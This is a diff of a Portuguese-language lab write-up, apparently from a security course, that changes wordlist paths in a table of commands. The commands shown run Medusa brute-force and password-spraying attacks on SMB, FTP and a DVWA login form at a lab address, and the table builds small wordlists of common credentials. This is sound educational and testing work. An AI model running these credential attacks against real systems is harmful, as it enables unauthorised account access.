@@ -85,10 +85,10 @@ Abaixo estão os comandos executados durante o desafio, com uma explicação de 
 
 | Comando | Descrição |
 | :--- | :--- |
-| `echo -e "user\nmsfadmin\nservice" > wordlists/smb_users.txt` | Cria um arquivo `smb_users.txt` com uma lista de possíveis nomes de usuário para o ataque ao SMB. O `\n` cria uma nova linha para cada nome. |
-| `echo -e "password\n123456\nwelcome123\nmsfadmin" > wordlists/senhas_spray.txt` | Cria um arquivo `senhas_spray.txt` com senhas comuns para o ataque de *password spraying*. |
-| `echo -e "user\nmsfadmin\nadmin\nroot" > wordlists/users.txt` | Cria uma wordlist de usuários comuns. |
-| `echo -e "123456\npassword\nqwerty\nmsfadmin" > wordlists/pass.txt` | Cria uma wordlist de senhas comuns. |
+| `echo -e "user\nmsfadmin\nservice" > smb_users.txt` | Cria um arquivo `smb_users.txt` com uma lista de possíveis nomes de usuário para o ataque ao SMB. O `\n` cria uma nova linha para cada nome. |
+| `echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt` | Cria um arquivo `senhas_spray.txt` com senhas comuns para o ataque de *password spraying*. |
+| `echo -e "user\nmsfadmin\nadmin\nroot" > users.txt` | Cria uma wordlist de usuários comuns. |
+| `echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt` | Cria uma wordlist de senhas comuns. |
 
 ### Ataques com Medusa
 
@@ -104,13 +104,13 @@ Abaixo estão os comandos executados durante o desafio, com uma explicação de 
 
 **1. Password Spraying em SMB**
 ```bash
-medusa -h 192.168.56.102 -U wordlists/smb_users.txt -P wordlists/senhas_spray.txt -M smbnt -t 2 -T 50
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ```
 - **Descrição:** Tenta autenticar em um serviço SMB (`-M smbnt`) usando uma lista de usuários (`-U`) contra uma lista pequena de senhas (`-P`). É uma técnica para evitar bloqueios de conta.
 
 **2. Força Bruta em Formulário Web (DVWA)**
 ```bash
-medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M http \
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
@@ -122,7 +122,7 @@ medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M http \
 
 **3. Força Bruta em FTP**
 ```bash
-medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
 ```
 - **Descrição:** Tenta descobrir credenciais de acesso para o serviço FTP (`-M ftp`) no alvo.
 
